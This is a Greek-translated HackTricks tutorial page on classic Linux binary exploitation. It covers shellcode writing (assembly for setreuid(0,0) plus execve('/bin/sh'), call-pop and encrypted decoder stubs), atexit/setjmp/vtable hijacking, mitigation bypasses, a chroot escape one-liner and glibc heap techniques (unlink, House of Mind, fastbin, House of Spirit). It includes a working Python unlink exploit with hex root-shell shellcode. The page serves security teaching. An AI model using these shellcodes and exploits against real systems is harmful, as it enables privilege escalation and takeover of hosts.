# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

Δείτε διακοπές πυρήνα: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; καθαρίζουμε το eax\
xor ebx, ebx ; ebx = 0 καθώς δεν υπάρχει επιχείρημα να περάσουμε\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Εκτέλεση syscall

**nasm -f elf assembly.asm** —> Μας επιστρέφει ένα .o\
**ld assembly.o -o shellcodeout** —> Μας δίνει ένα εκτελέσιμο που σχηματίζεται από τον κώδικα συναρμολόγησης και μπορούμε να πάρουμε τους opcodes με **objdump**\
**objdump -d -Mintel ./shellcodeout** —> Για να δούμε ότι είναι πράγματι η shellcode μας και να πάρουμε τους OpCodes

**Ελέγξτε ότι η shellcode λειτουργεί**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Για να δούμε ότι οι κλήσεις συστήματος εκτελούνται σωστά, πρέπει να μεταγλωττίσουμε το προηγούμενο πρόγραμμα και οι κλήσεις συστήματος πρέπει να εμφανίζονται σε **strace ./PROGRAMA\_COMPILADO**

Όταν δημιουργούμε shellcodes, μπορούμε να κάνουμε ένα κόλπο. Η πρώτη εντολή είναι ένα jump σε ένα call. Το call καλεί τον αρχικό κώδικα και επιπλέον βάζει στο stack το EIP. Μετά από την εντολή call έχουμε βάλει το string που χρειαζόμαστε, οπότε με αυτό το EIP μπορούμε να δείξουμε στο string και επιπλέον να συνεχίσουμε την εκτέλεση του κώδικα.

ΕJ **ΚΟΛΠΟ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**EJ χρησιμοποιώντας το Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Huter:**

Αποτελείται από έναν μικρό κώδικα που διασχίζει τις σελίδες μνήμης που σχετίζονται με μια διαδικασία αναζητώντας τη shellcode που είναι αποθηκευμένη εκεί (αναζητά κάποια υπογραφή που έχει τοποθετηθεί στη shellcode). Χρήσιμο σε περιπτώσεις όπου υπάρχει μόνο ένας μικρός χώρος για να εισαχθεί κώδικας.

**Shellcodes polimórficos**

Αποτελούνται από κωδικούς shell που είναι κρυπτογραφημένοι και περιέχουν έναν μικρό κώδικα που τους αποκρυπτογραφεί και πηδά σε αυτόν, χρησιμοποιώντας το κόλπο Call-Pop αυτό θα ήταν ένα **παράδειγμα κρυπτογραφημένου κωδικού cesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5.Συμπληρωματικές μέθοδοι**

**Τεχνική του Murat**

Στο linux όλα τα προγράμματα χαρτογραφούνται ξεκινώντας από 0xbfffffff

Βλέποντας πώς κατασκευάζεται η στοίβα ενός νέου διαδικασίας στο linux, μπορεί να αναπτυχθεί ένα exploit με τέτοιο τρόπο ώστε το πρόγραμμα να εκκινείται σε ένα περιβάλλον του οποίου η μοναδική μεταβλητή είναι η shellcode. Η διεύθυνση αυτής μπορεί να υπολογιστεί ως: addr = 0xbfffffff - 4 - strlen(ΟΝΟΜΑ\_εκτελέσιμου\_αρχείου) - strlen(shellcode)

Με αυτόν τον τρόπο θα αποκτηθεί απλά η διεύθυνση όπου βρίσκεται η μεταβλητή περιβάλλοντος με τη shellcode.

Αυτό μπορεί να γίνει χάρη στο γεγονός ότι η συνάρτηση execle επιτρέπει τη δημιουργία ενός περιβάλλοντος που να έχει μόνο τις μεταβλητές περιβάλλοντος που επιθυμούνται.

### **Format Strings to Buffer Overflows**

Η **sprintf moves** μια μορφοποιημένη συμβολοσειρά **σε** μια **μεταβλητή.** Επομένως, θα μπορούσατε να εκμεταλλευτείτε τη **μορφοποίηση** μιας συμβολοσειράς για να προκαλέσετε μια **buffer overflow στη μεταβλητή** όπου αντιγράφεται το περιεχόμενο.\
Για παράδειγμα, το payload `%.44xAAAA` θα **γράψει 44B+"AAAA" στη μεταβλητή**, κάτι που μπορεί να προκαλέσει μια buffer overflow.

### **\_\_atexit Structures**

{% hint style="danger" %}
Σήμερα είναι πολύ **περίεργο να εκμεταλλευτείς αυτό**.
{% endhint %}

**`atexit()`** είναι μια συνάρτηση στην οποία **περνιούνται άλλες συναρτήσεις ως παράμετροι.** Αυτές οι **συναρτήσεις** θα **εκτελούνται** κατά την εκτέλεση μιας **`exit()`** ή της **επιστροφής** της **κύριας**.\
Αν μπορείτε να **τροποποιήσετε** τη **διεύθυνση** οποιασδήποτε από αυτές τις **συναρτήσεις** ώστε να δείχνει σε μια shellcode, για παράδειγμα, θα **κερδίσετε έλεγχο** της **διαδικασίας**, αλλά αυτό είναι αυτή τη στιγμή πιο περίπλοκο.\
Αυτή τη στιγμή οι **διευθύνσεις στις συναρτήσεις** που θα εκτελούνται είναι **κρυμμένες** πίσω από πολλές δομές και τελικά η διεύθυνση στην οποία δείχνουν δεν είναι οι διευθύνσεις των συναρτήσεων, αλλά είναι **κρυπτογραφημένες με XOR** και μετατοπίσεις με μια **τυχαία κλειδί**. Έτσι, αυτή τη στιγμή αυτός ο επιθετικός παράγοντας δεν είναι **πολύ χρήσιμος τουλάχιστον σε x86** και **x64\_86**.\
Η **συνάρτηση κρυπτογράφησης** είναι **`PTR_MANGLE`**. **Άλλες αρχιτεκτονικές** όπως m68k, mips32, mips64, aarch64, arm, hppa... **δεν υλοποιούν τη συνάρτηση κρυπτογράφησης** γιατί **επιστρέφει το ίδιο** με αυτό που έλαβε ως είσοδο. Έτσι, αυτές οι αρχιτεκτονικές θα μπορούσαν να επιτεθούν μέσω αυτού του παραδείγματος.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Σήμερα είναι πολύ **περίεργο να εκμεταλλευτείς αυτό**.
{% endhint %}

**`Setjmp()`** επιτρέπει να **αποθηκεύσετε** το **περιβάλλον** (τους καταχωρητές)\
**`longjmp()`** επιτρέπει να **αποκαταστήσετε** το **περιβάλλον**.\
Οι **αποθηκευμένοι καταχωρητές** είναι: `EBX, ESI, EDI, ESP, EIP, EBP`\
Αυτό που συμβαίνει είναι ότι το EIP και το ESP περνιούνται από τη **συνάρτηση `PTR_MANGLE`**, έτσι οι **αρχιτεκτονικές ευάλωτες σε αυτήν την επίθεση είναι οι ίδιες με τις παραπάνω**.\
Είναι χρήσιμες για αποκατάσταση σφαλμάτων ή διακοπές.\
Ωστόσο, από όσα έχω διαβάσει, οι άλλοι καταχωρητές δεν είναι προστατευμένοι, **έτσι αν υπάρχει μια `call ebx`, `call esi` ή `call edi`** μέσα στη συνάρτηση που καλείται, μπορεί να αναληφθεί ο έλεγχος. Ή θα μπορούσατε επίσης να τροποποιήσετε το EBP για να τροποποιήσετε το ESP.

**VTable και VPTR σε C++**

Κάθε κλάση έχει μια **Vtable** που είναι ένας πίνακας **δεικτών σε μεθόδους**.

Κάθε αντικείμενο μιας **κλάσης** έχει ένα **VPtr** που είναι ένας **δείκτης** στον πίνακα της κλάσης του. Το VPtr είναι μέρος της κεφαλίδας κάθε αντικειμένου, έτσι αν επιτευχθεί μια **υπεργραφή** του **VPtr** μπορεί να **τροποποιηθεί** ώστε να **δείχνει** σε μια ψεύτικη μέθοδο ώστε η εκτέλεση μιας συνάρτησης να πηγαίνει στη shellcode.

## **Προληπτικά μέτρα και παρακάμψεις**

**Αντικατάσταση του Libsafe**

Ενεργοποιείται με: LD\_PRELOAD=/lib/libsafe.so.2\
ή\
“/lib/libsave.so.2” > /etc/ld.so.preload

Εμποδίζει τις κλήσεις σε ορισμένες ανασφαλείς συναρτήσεις με άλλες ασφαλείς. Δεν είναι τυποποιημένο. (μόνο για x86, όχι για κατασκευές με -fomit-frame-pointer, όχι στατικές κατασκευές, όχι όλες οι ευάλωτες συναρτήσεις γίνονται ασφαλείς και το LD\_PRELOAD δεν λειτουργεί σε δυαδικά με suid).

**ASCII Armored Address Space**

Συνίσταται στη φόρτωση των κοινών βιβλιοθηκών από 0x00000000 έως 0x00ffffff ώστε να υπάρχει πάντα ένα byte 0x00. Ωστόσο, αυτό πραγματικά δεν σταματά σχεδόν καμία επίθεση, και λιγότερο σε little endian.

**ret2plt**

Συνίσταται στην εκτέλεση ενός ROP ώστε να καλείται η συνάρτηση strcpy@plt (από την plt) και να δείχνει στην είσοδο της GOT και να αντιγράφει το πρώτο byte της συνάρτησης που θέλουμε να καλέσουμε (system()). Αμέσως μετά γίνεται το ίδιο δείχνοντας στο GOT+1 και αντιγράφεται το 2ο byte του system()… Στο τέλος καλείται η διεύθυνση που αποθηκεύτηκε στην GOT που θα είναι το system().

**Κλουβιά με chroot()**

debootstrap -arch=i386 hardy /home/user —> Εγκαθιστά ένα βασικό σύστημα κάτω από έναν συγκεκριμένο υποκατάλογο

Ένας διαχειριστής μπορεί να βγει από ένα από αυτά τα κλουβιά κάνοντας: mkdir foo; chroot foo; cd ..

**Εργαλειοποίηση κώδικα**

Valgrind —> Ψάχνει για σφάλματα\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Βασικά exploits**

**Κατακερματισμένο κομμάτι**

prev\_size |\
size | —Κεφαλίδα\
\*mem | Δεδομένα

**Ελεύθερο κομμάτι**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk —Κεφαλίδα\
\*mem | Δεδομένα

Τα ελεύθερα κομμάτια βρίσκονται σε μια διπλά συνδεδεμένη λίστα (bin) και δεν μπορούν να υπάρχουν δύο ελεύθερα κομμάτια μαζί (συγχωνεύονται)

Στο “size” υπάρχουν bits για να υποδείξουν: Αν το προηγούμενο κομμάτι είναι σε χρήση, αν το κομμάτι έχει ανατεθεί μέσω mmap() και αν το κομμάτι ανήκει στην κύρια αρένα.

Αν κατά την απελευθέρωση ενός κομματιού κάποιο από τα γειτονικά είναι ελεύθερο, αυτά συγχωνεύονται μέσω της μακροεντολής unlink() και το νέο μεγαλύτερο κομμάτι περνάει στο frontlink() για να του εισαχθεί το κατάλληλο bin.

unlink(){\
BK = P->bk; —> Το BK του νέου chunk είναι αυτό που είχε το ήδη ελεύθερο\
FD = P->fd; —> Το FD του νέου chunk είναι αυτό που είχε το ήδη ελεύθερο\
FD->bk = BK; —> Το BK του επόμενου chunk δείχνει στο νέο chunk\
BK->fd = FD; —> Το FD του προηγούμενου chunk δείχνει στο νέο chunk\
}

Έτσι, αν καταφέρουμε να τροποποιήσουμε το P->bk με τη διεύθυνση μιας shellcode και το P->fd με τη διεύθυνση σε μια είσοδο στην GOT ή DTORS λιγότερο 12, επιτυγχάνεται:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Και έτσι εκτελείται η shellcode κατά την έξοδο από το πρόγραμμα.

Επιπλέον, η 4η δήλωση του unlink() γράφει κάτι και η shellcode πρέπει να είναι προσαρμοσμένη για αυτό:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> Αυτό προκαλεί την εγγραφή 4 bytes από το 8ο byte της shellcode, οπότε η πρώτη εντολή της shellcode πρέπει να είναι ένα jmp για να παραλείψει αυτό και να πέσει σε κάποια nops που θα οδηγήσουν στο υπόλοιπο της shellcode.

Έτσι, το exploit δημιουργείται:

Στο buffer1 βάζουμε τη shellcode ξεκινώντας με ένα jmp ώστε να πέσει σε nops ή στο υπόλοιπο της shellcode.

Μετά τη shellcode βάζουμε γέμισμα μέχρι να φτάσουμε στο πεδίο prev\_size και size του επόμενου κομματιού. Σε αυτές τις θέσεις βάζουμε 0xfffffff0 (έτσι ώστε να υπεργραφεί το prev\_size ώστε να έχει το bit που λέει ότι είναι ελεύθερο) και “-4“(0xfffffffc) στο size (έτσι ώστε όταν ελέγξει στο 3ο κομμάτι αν το 2ο ήταν ελεύθερο στην πραγματικότητα να πάει στο τροποποιημένο prev\_size που θα του πει ότι είναι ελεύθερο) -> Έτσι όταν το free() ερευνήσει θα πάει στο size του 3ου αλλά στην πραγματικότητα θα πάει στο 2ο - 4 και θα νομίζει ότι το 2ο κομμάτι είναι ελεύθερο. Και τότε θα καλέσει το **unlink()**.

Κατά την κλήση του unlink() θα χρησιμοποιήσει ως P->fd τα πρώτα δεδομένα του 2ου κομματιού, οπότε εκεί θα μπει η διεύθυνση που θέλετε να υπεργράψετε - 12 (διότι στο FD->bk θα προσθέσει 12 στη διεύθυνση που αποθηκεύτηκε στο FD). Και σε αυτή τη διεύθυνση θα εισαχθεί η δεύτερη διεύθυνση που θα βρει στο 2ο κομμάτι, που μας ενδιαφέρει να είναι η διεύθυνση στη shellcode (P->bk ψεύτικο).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Ενδιαφέρει να είναι το bit που υποδεικνύει ότι το προηγούμενο κομμάτι είναι ελεύθερο σε 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, ώστε να νομίζει ότι το “size” του 3ου κομματιού είναι 4bytes πίσω (δείχνει στο prev\_size) διότι εκεί κοιτάζει αν το 2ο κομμάτι είναι ελεύθερο**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Στο payload στην αρχή θα βάλουμε 8bytes γέμισμα**

**got\_free = pack("\<I", 0x08048300 - 12) #Διεύθυνση του free() στην plt-12 (θα είναι η διεύθυνση που θα υπεργραφεί ώστε να εκτελείται η shellcode την 2η φορά που θα καλέσετε το free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Όπως είπαμε το payload ξεκινά με 8 bytes γέμισμα γιατί ναι**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Τροποποιείται το 2ο κομμάτι, το got\_free δείχνει εκεί που θα αποθηκεύσουμε τη διεύθυνση addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() απελευθερώνοντας με αντίστροφη σειρά (wargame)**

Ελέγχουμε 3 διαδοχικά κομμάτια και απελευθερώνονται με αντίστροφη σειρά από αυτήν που κρατήθηκαν.

Σε αυτή την περίπτωση:

Στο chunk c βάζουμε τη shellcode

Το chunk a το χρησιμοποιούμε για να υπεργράψουμε το b έτσι ώστε το size να έχει το bit PREV\_INUSE απενεργοποιημένο ώστε να νομίζει ότι το chunk a είναι ελεύθερο.

Επιπλέον, υπεργράφουμε στην κεφαλίδα b το size ώστε να είναι -4.

Έτσι, το πρόγραμμα θα νομίζει ότι το “a” είναι ελεύθερο και σε ένα bin, οπότε θα καλέσει το unlink() για να το αποσυνδέσει. Ωστόσο, καθώς η κεφαλίδα PREV\_SIZE είναι -4, θα νομίζει ότι το κομμάτι “a” στην πραγματικότητα αρχίζει στο b+4. Δηλαδή, θα κάνει ένα unlink() σε ένα κομμάτι που αρχίζει στο b+4, οπότε στο b+12 θα είναι ο δείκτης “fd” και στο b+16 θα είναι ο δείκτης “bk”.

Με αυτόν τον τρόπο, αν στο bk βάλουμε τη διεύθυνση στη shellcode και στο fd βάλουμε τη διεύθυνση στη συνάρτηση “puts()”-12 έχουμε το payload μας.

**Τεχνική Frontlink**

Ονομάζεται frontlink όταν απελευθερώνεται κάτι και κανένα από τα γειτονικά του κομμάτια δεν είναι ελεύθερα, δεν καλείται το unlink() αλλά καλείται απευθείας το frontlink().

Ευπάθεια χρήσιμη όταν το malloc που επιτίθεται δεν απελευθερώνεται ποτέ (free()).

Απαιτεί:

Ένα buffer που μπορεί να υπερχειλίσει με τη συνάρτηση εισόδου δεδομένων

Ένα buffer γειτονικό σε αυτό που πρέπει να απελευθερωθεί και του οποίου θα τροποποιηθεί το πεδίο fd της κεφαλίδας χάρη στην υπερχείλιση του προηγούμενου buffer

Ένα buffer προς απελευθέρωση με μέγεθος μεγαλύτερο από 512 αλλά μικρότερο από το προηγούμενο buffer

Ένα buffer δηλωμένο πριν από το βήμα 3 που επιτρέπει την υπεργραφή του prev\_size αυτού

Με αυτόν τον τρόπο, επιτυγχάνοντας να υπεργράψουμε σε δύο mallocs με ανεξέλεγκτο τρόπο και σε ένα με ελεγχόμενο τρόπο αλλά που απελευθερώνεται μόνο αυτό, μπορούμε να κάνουμε ένα exploit.

**Ευπάθεια double free()**

Αν καλέσετε δύο φορές το free() με τον ίδιο δείκτη, μένουν δύο bins να δείχνουν στην ίδια διεύθυνση.

Σε περίπτωση που θέλετε να ξαναχρησιμοποιήσετε ένα, θα ανατεθεί χωρίς προβλήματα. Σε περίπτωση που θέλετε να χρησιμοποιήσετε άλλο, θα του ανατεθεί ο ίδιος χώρος, οπότε θα έχουμε τους δείκτες “fd” και “bk” ψευδείς με τα δεδομένα που θα γράψει η προηγούμενη κράτηση.

**After free()**

Ένας δείκτης που έχει απελευθερωθεί προηγουμένως χρησιμοποιείται ξανά χωρίς έλεγχο.

## **8 Heap Overflows: Προχωρημένα exploits**

Οι τεχνικές Unlink() και FrontLink() αφαιρέθηκαν τροποποιώντας τη συνάρτηση unlink().

**The house of mind**

Μόνο μια κλήση στο free() είναι απαραίτητη για να προκαλέσει την εκτέλεση αυθαίρετου κώδικα. Ενδιαφέρει να αναζητήσουμε ένα δεύτερο κομμάτι που μπορεί να υπερχειλιστεί από ένα προηγούμενο και να απελευθερωθεί.

Μια κλήση στο free() προκαλεί την κλήση του public\_fREe(mem), αυτό κάνει:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mem); —> Επιστρέφει έναν δείκτη στη διεύθυνση όπου αρχίζει το κομμάτι (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

Στο \[1] ελέγχει το πεδίο size το bit NON\_MAIN\_ARENA, το οποίο μπορεί να τροποποιηθεί ώστε η επαλήθευση να επιστρέψει true και να εκτελέσει το heap\_for\_ptr() που κάνει ένα and στο “mem” αφήνοντας 0 τα 2.5 λιγότερο σημαντικά bytes (στην περίπτωσή μας από 0x0804a000 αφήνει 0x08000000) και έχει πρόσβαση στο 0x08000000->ar\_ptr (σαν να ήταν μια δομή heap\_info)

Με αυτόν τον τρόπο, αν μπορούμε να ελέγξουμε ένα κομμάτι, για παράδειγμα, στο 0x0804a000 και πρόκειται να απελευθερωθεί ένα κομμάτι στο **0x081002a0**, μπορούμε να φτάσουμε στη διεύθυνση 0x08100000 και να γράψουμε ό,τι θέλουμε, για παράδειγμα **0x0804a000**. Όταν αυτό το δεύτερο κομμάτι απελευθερωθεί, θα διαπιστώσει ότι το heap\_for\_ptr(ptr)->ar\_ptr επιστρέφει αυτό που έχουμε γράψει στο 0x08100000 (διότι εφαρμόζεται στο 0x081002a0 το and που είδαμε πριν και από εκεί εξάγεται η τιμή των 4 πρώτων bytes, το ar\_ptr)

Με αυτόν τον τρόπο καλείται το \_int\_free(ar\_ptr, mem), δηλαδή, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Όπως είδαμε πριν, μπορούμε να ελέγξουμε την τιμή του av, διότι είναι αυτό που γράψαμε στο κομμάτι που πρόκειται να απελευθερωθεί.

Ακριβώς όπως ορίζεται το unsorted\_chunks, γνωρίζουμε ότι:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Έτσι, αν στο av->bins\[2] γράψουμε την τιμή του \_\_DTOR\_END\_\_-12 στην τελευταία εντολή θα γραφτεί στο \_\_DTOR\_END\_\_ η διεύθυνση του δεύτερου κομματιού.

Δηλαδή, στο πρώτο κομμάτι πρέπει να βάλουμε στην αρχή πολλές φορές τη διεύθυνση του \_\_DTOR\_END\_\_-12 γιατί από εκεί θα την πάρει το av->bins\[2]

Στη διεύθυνση που θα πέσει η διεύθυνση του δεύτερου κομματιού με τα τελευταία 5 μηδενικά πρέπει να γράψουμε τη διεύθυνση σε αυτό το πρώτο κομμάτι ώστε το heap\_for\_ptr() να νομίζει ότι το ar\_ptr είναι στην αρχή του πρώτου κομματιού και να εξάγει από εκεί το av->bins\[2]

Στο δεύτερο κομμάτι και χάρη στο πρώτο υπεργράφουμε το prev\_size με ένα jump 0x0c και το size με κάτι για να ενεργοποιήσουμε -> NON\_MAIN\_ARENA

Στη συνέχεια, στο κομμάτι 2 βάζουμε μια σωρεία nops και τελικά τη shellcode.

Με αυτόν τον τρόπο θα κληθεί το \_int\_free(TROZO1, TROZO2) και θα ακολουθήσει τις εντολές για να γράψει στο \_\_DTOR\_END\_\_ τη διεύθυνση του prev\_size του TROZO2, το οποίο θα πηδήξει στη shellcode.

Για να εφαρμοστεί αυτή η τεχνική απαιτείται να πληρούνται ορισμένες επιπλέον απαιτήσεις που περιπλέκουν λίγο περισσότερο το payload.

Αυτή η τεχνική δεν είναι πλέον εφαρμόσιμη καθώς εφαρμόστηκε σχεδόν η ίδια επιδιόρθωση όπως για το unlink. Συγκρίνονται αν η νέα θέση στην οποία δείχνει δείχνει επίσης σε αυτήν.

**Fastbin**

Είναι μια παραλλαγή του The house of mind

μας ενδιαφέρει να φτάσουμε να εκτελέσουμε τον παρακάτω κώδικα στον οποίο φτάνουμε μετά την πρώτη επαλήθευση της συνάρτησης \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] —> Όντας fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Με αυτόν τον τρόπο, αν βάλουμε στο “fb” τη διεύθυνση μιας συνάρτησης στη GOT, σε αυτή τη διεύθυνση θα τοποθετηθεί η διεύθυνση του υπεργραφόμενου κομματιού. Για αυτό θα είναι απαραίτητο η αρένα να είναι κοντά στις διευθύνσεις των dtors. Πιο συγκεκριμένα, το av->max\_fast πρέπει να είναι στη διεύθυνση που θα υπεργραφεί.

Δεδομένου ότι με το The House of Mind είδαμε ότι ελέγχαμε τη θέση του av.

Έτσι, αν στο πεδίο size βάλουμε ένα μέγεθος 8 + NON\_MAIN\_ARENA + PREV\_INUSE —> fastbin\_index() θα μας επιστρέψει fastbins\[-1], που θα δείχνει στο av->max\_fast

Σε αυτή την περίπτωση, το av->max\_fast θα είναι η διεύθυνση που θα υπεργραφεί (όχι σε αυτή που δείχνει, αλλά αυτή η θέση θα είναι η οποία θα υπεργραφεί).

Επιπλέον, πρέπει να πληροί ότι το κομμάτι γειτονικό στο απελευθερωμένο πρέπει να είναι μεγαλύτερο από 8 -> Δεδομένου ότι είπαμε ότι το size του απελευθερωμένου κομματιού είναι 8, σε αυτό το ψεύτικο κομμάτι πρέπει να βάλουμε ένα size μεγαλύτερο από 8 (καθώς επιπλέον η shellcode θα πάει στο απελευθερωμένο κομμάτι, θα πρέπει να βάλουμε στην αρχή ένα jmp που θα πέσει σε nops).

Επιπλέον, αυτό το ίδιο ψεύτικο κομμάτι πρέπει να είναι μικρότερο από το av->system\_mem. Το av->system\_mem βρίσκεται 1848 bytes πιο πέρα.

Λόγω των μηδενικών του \_DTOR\_END\_ και των λίγων διευθύνσεων στη GOT, καμία διεύθυνση αυτών των τμημάτων δεν είναι κατάλληλη για να υπεργραφούν, οπότε ας δούμε πώς να εφαρμόσουμε το fastbin για να επιτεθούμε στη στοίβα.

Μια άλλη μορφή επίθεσης είναι να ανακατευθύνουμε το **av** προς τη στοίβα.

Αν τροποποιήσουμε το size ώστε να είναι 16 αντί για 8, τότε: fastbin\_index() θα μας επιστρέψει fastbins\[0] και μπορούμε να το χρησιμοποιήσουμε για να υπεργράψουμε τη στοίβα.

Για αυτό δεν πρέπει να υπάρχει κανένας canary ή περίεργες τιμές στη στοίβα, στην πραγματικότητα πρέπει να βρισκόμαστε σε αυτήν: 4bytes μηδενικά + EBP + RET

Τα 4 bytes μηδενικά χρειάζονται ώστε το **av** να είναι σε αυτή τη διεύθυνση και το πρώτο στοιχείο ενός **av** είναι το mutex που πρέπει να είναι 0.

Το **av->max\_fast** θα είναι το EBP και θα είναι μια τιμή που θα μας εξυπηρετήσει για να παρακάμψουμε τους περιορισμούς.

Στο **av->fastbins\[0]** θα υπεργραφεί με τη διεύθυνση του **p** και θα είναι το RET, έτσι θα παρακαμφθεί στη shellcode.

Επιπλέον, στο **av->system\_mem** (1484bytes πάνω από τη θέση στη στοίβα) θα υπάρχει αρκετή σαβούρα που θα μας επιτρέψει να παρακάμψουμε την επαλήθευση που πραγματοποιείται.

Επιπλέον, πρέπει να πληροί ότι το κομμάτι γειτονικό στο απελευθερωμένο πρέπει να είναι μεγαλύτερο από 8 -> Δεδομένου ότι είπαμε ότι το size του απελευθερωμένου κομματιού είναι 16, σε αυτό το ψεύτικο κομμάτι πρέπει να βάλουμε ένα size μεγαλύτερο από 8 (καθώς επιπλέον η shellcode θα πάει στο απελευθερωμένο κομμάτι, θα πρέπει να βάλουμε στην αρχή ένα jmp που θα πέσει σε nops που θα ακολουθήσουν το πεδίο size του νέου ψεύτικου κομματιού).

**The House of Spirit**

Σε αυτή την περίπτωση αναζητούμε να έχουμε έναν δείκτη σε ένα malloc που μπορεί να είναι τροποποιήσιμο από τον επιτιθέμενο (π.χ., ο δείκτης να είναι στη στοίβα κάτω από μια πιθανή υπερχείλιση σε μια μεταβλητή).

Έτσι, θα μπορούσαμε να κάνουμε αυτόν τον δείκτη να δείχνει όπου θέλουμε. Ωστόσο, δεν είναι κάθε θέση έγκυρη, το μέγεθος του ψεύτικου κομματιού πρέπει να είναι μικρότερο από το av->max\_fast και πιο συγκεκριμένα ίσο με το μέγεθος που ζητήθηκε σε μια μελλοντική κλήση στο malloc()+8. Για αυτό, αν ξέρουμε ότι μετά από αυτόν τον ευάλωτο δείκτη καλείται malloc(40), το μέγεθος του ψεύτικου κομματιού πρέπει να είναι ίσο με 48.

